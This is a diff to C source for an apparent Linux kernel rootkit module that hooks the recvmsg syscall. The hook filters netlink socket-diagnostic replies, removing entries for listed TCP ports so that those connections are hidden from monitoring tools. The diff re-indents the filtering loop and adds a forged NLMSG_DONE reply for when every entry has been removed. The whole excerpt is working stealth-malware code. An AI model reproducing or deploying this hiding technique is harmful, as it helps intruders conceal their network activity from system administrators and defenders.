@@ -81,32 +81,40 @@ static long my_sys_recvmsg(int fd, struct msghdr __user *msg, unsigned flags){
 		if(error > 0) return lres; //copy from user failed, can't access memory
 
 		if(mmsg->msg_iovlen == msg->msg_iovlen){ //prevent us from processing garbage (happens)
-		
-		msglen = mmsg->msg_iov->iov_len;
-
-		nlh = (struct nlmsghdr *) mmsg->msg_iov->iov_base;
-		
-		do{
-			diag_msg = NLMSG_DATA(nlh);
-			sport = htons(diag_msg->id.idiag_sport);
-			dport = htons(diag_msg->id.idiag_dport);
-	
-			//printk(KERN_INFO "s: %d\n", sport);
 			
-			if(in_tcplist(sport)){ //don't hide target ports...
-			//	printk(KERN_INFO "hiding port %d", sport);
+			msglen = mmsg->msg_iov->iov_len;
+
+			nlh = (struct nlmsghdr *) mmsg->msg_iov->iov_base;
+			
+			do{
+				diag_msg = NLMSG_DATA(nlh);
+				sport = htons(diag_msg->id.idiag_sport);
+				dport = htons(diag_msg->id.idiag_dport);
+		
+				//printk(KERN_INFO "s: %d\n", sport);
 				
-				lres -= NLMSG_ALIGN((nlh)->nlmsg_len);
-				nxt = NLMSG_NEXT(nlh, msglen);
-				memmove(nlh, nxt, msglen); //shift entries
-			}
-			else{
-				nlh = NLMSG_NEXT(nlh, msglen);
-			}
-			//printk(KERN_INFO "---------------------------\n");
-			}while(NLMSG_OK(nlh, msglen));
-		error = copy_to_user(msg->msg_iov->iov_base, mmsg->msg_iov->iov_base, lres);
-		kfree(mmsg);
+				if(in_tcplist(sport)){ //don't hide target ports...
+				//	printk(KERN_INFO "hiding port %d", sport);
+					
+					lres -= NLMSG_ALIGN((nlh)->nlmsg_len);
+					nxt = NLMSG_NEXT(nlh, msglen);
+					memmove(nlh, nxt, msglen); //shift entries
+				}
+				else{
+					nlh = NLMSG_NEXT(nlh, msglen);
+				}
+				//printk(KERN_INFO "---------------------------\n");
+				}while(NLMSG_OK(nlh, msglen));
+			if(lres == 0){// no valid message left
+				nlh = (struct nlmsghdr *) mmsg->msg_iov->iov_base;
+				nlh->nlmsg_seq = 123456;
+				nlh->nlmsg_type = NLMSG_DONE;
+				nlh->nlmsg_len = sizeof(struct nlmsghdr);
+				lres = sizeof(struct nlmsghdr);
+			}		
+
+			error = copy_to_user(msg->msg_iov->iov_base, mmsg->msg_iov->iov_base, lres);
+			kfree(mmsg);
 		}
 	} 
 out:	--rcount;
